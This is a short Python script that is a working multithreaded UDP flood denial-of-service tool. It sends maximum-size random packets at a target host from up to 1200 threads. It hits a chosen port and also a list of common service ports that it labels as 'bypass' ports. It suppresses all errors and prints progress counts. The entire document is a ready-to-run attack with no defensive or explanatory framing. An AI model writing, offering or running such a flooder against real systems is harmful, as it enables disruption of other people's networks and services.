#!/usr/bin/env python3
import socket, random, time, threading, sys

target = sys.argv[1]
port = int(sys.argv[2])
duration = int(sys.argv[3])
threads = int(sys.argv[4]) if len(sys.argv) > 4 else 1200

def flood():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        payload = random._urandom(65507)
        end = time.time() + duration
        count = 0
        bypass_ports = [53, 80, 443, 8080, 8443, 123, 161, 389, 3306, 21, 22, 25, 110, 143, 993, 995]
        while time.time() < end:
            try:
                s.sendto(payload, (target, random.choice(bypass_ports)))
                s.sendto(payload, (target, port))
                count += 2
                if count % 10000 == 0:
                    sys.stderr.write(f"UDP BYPASS: {count} packets\n")
            except:
                pass
        s.close()
        sys.stderr.write(f"UDP BYPASS completed: {count} packets\n")
    except:
        pass

for i in range(threads):
    threading.Thread(target=flood, daemon=True).start()
time.sleep(duration + 2)
